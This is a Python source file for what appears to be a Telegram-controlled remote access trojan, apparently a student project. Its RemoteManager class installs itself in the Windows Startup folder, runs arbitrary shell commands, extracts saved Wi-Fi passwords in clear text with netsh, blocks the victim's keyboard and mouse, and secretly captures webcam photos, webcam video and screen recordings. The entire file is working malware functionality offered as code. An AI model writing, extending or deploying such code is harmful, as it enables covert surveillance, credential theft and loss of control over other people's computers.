import ctypes
import getpass
import io
import os
import subprocess
import threading
import time
import cv2
import keyboard
import numpy as np
import pyautogui
import pyttsx3
import webbrowser

from aiogram import types
from pynput.mouse import Controller


class RemoteManager:
    def __init__(self, bot):
        self.bot = bot
        self.USER_NAME = getpass.getuser()
        self.width, self.height = pyautogui.size()

    def add_to_startup(self, file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % self.USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

    def execute(self, command):
        try:
            if command[0] == 'cd' and len(command) > 1:
                result = self.change_directory(command[1])
            elif command[0] == 'wifi':
                result = self.get_passwords()
            else:
                result = self.execute_command_console(command)

        except Exception:
            result = "[-] Error"

        return result if not result.isspace() else "Неизвестная комманда"

    def execute_command_console(self, command):
        child = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        my_out = io.TextIOWrapper(child.stdout, encoding='cp866')
        shell_output_string = ' '
        res = ''
        while shell_output_string:
            shell_output_string = my_out.readline()
            new_string = ' '.join(shell_output_string.split()) + '\n'
            res += new_string

        return res

    def open_url(self, url="https://www.youtube.com/watch?v=dQw4w9WgXcQ"):
        webbrowser.open(url, new=1)

    def get_passwords(self):
        wifi_list = self.execute_command_console("netsh wlan show profiles")

        data = wifi_list.split('\n')

        names = []
        for i in data:
            if "Все профили пользователей" in i:
                i = i.split(":")
                i = i[1]
                i = i[1::]
                names.append(i)

        passwords = []
        for name in names:
            password_list = self.execute_command_console(f'netsh wlan show profile name="{name}" key=clear')
            data = password_list.split('\n')
            for i in data:
                if "Содержимое ключа" in i:
                    i = i.split(":")
                    i = i[1]
                    i = i[1::]
                    passwords.append(i)

        res = ''
        for i in range(len(passwords)):
            res += f"{names[i]} : {passwords[i]}\n"

        return res

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"[+] Changing directory to {self.execute_command_console('cd')}"
        except FileNotFoundError:
            return "Cannot find this path/file/dir"
        except OSError:
            return "Syntax error in name of path/file/dir"

    async def say_text(self, text):
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()

    def blockinput(self):
        global block_input_flag
        block_input_flag = 1
        t1 = threading.Thread(target=self.blockinput_start)
        t1.start()
        print("[SUCCESS] Input blocked!")

    def blockinput_stop(self):
        global block_input_flag
        for i in range(150):
            keyboard.unblock_key(i)
        block_input_flag = 0

    def blockinput_start(self):
        mouse = Controller()
        global block_input_flag
        for i in range(150):
            keyboard.block_key(i)
        while block_input_flag == 1:
            mouse.position = (0, 0)

    def make_cam_photo(self):
        cap = cv2.VideoCapture(0)

        # Check if the webcam is opened correctly
        if not cap.isOpened():
            res = "Error! No access to cam"

        ret, frame = cap.read()
        # уменьшить в 2 раза
        frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)
        cv2.imwrite("screen_camera.png", frame)

        cap.release()
        cv2.destroyAllWindows()

    def make_cam_video(self):
        cap = cv2.VideoCapture(0)

        cap.set(cv2.CAP_PROP_FPS, 20)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

        codec = cv2.VideoWriter_fourcc(*'MJPG')
        out = cv2.VideoWriter('webvideo.avi', codec, 20, (640, 480))

        frames = 0
        while True:
            ret, frame = cap.read()
            out.write(frame)

            time.sleep(0.01)
            frames += 1
            if frames > 300:
                break

        out.release()
        cap.release()
        cv2.destroyAllWindows()

        return types.InputFile(path_or_bytesio='webvideo.avi')

    def make_desktop_video(self):
        codec = cv2.VideoWriter_fourcc(*'MJPG')
        out = cv2.VideoWriter('webvideo.avi', codec, 20, (640, 480))

        frames = 0
        while True:

            image = pyautogui.screenshot(region=(0, 0, self.width, self.height))
            frame = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
            out.write(frame)

            time.sleep(0.01)
            frames += 1
            if frames > 300:
                break

        out.release()
        cv2.destroyAllWindows()

        return types.InputFile(path_or_bytesio='webvideo.avi')

    def change_background(self, path='D:\\kursach_telegram\\img_1.png'):
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
